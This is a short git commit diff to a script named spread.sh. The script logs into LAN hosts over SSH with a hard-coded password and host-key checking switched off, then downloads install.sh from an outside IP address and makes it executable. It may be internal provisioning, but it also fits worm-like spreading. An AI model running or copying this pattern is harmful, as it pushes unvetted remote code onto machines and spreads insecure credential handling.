fda8fc00b3d80afc1d0bca5dbd59080eef9d7cac
nitrogen <liquid.nitrogenium@gmail.com>
2022-10-31 23:58:52 +0500

    wip

--- public/spread.sh
+++ public/spread.sh
@@ -5,4 +5,4 @@ i=39
 echo "Processing 192.168.2.$i"
 
 
-sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "cd /usr/bin && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"
+sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"
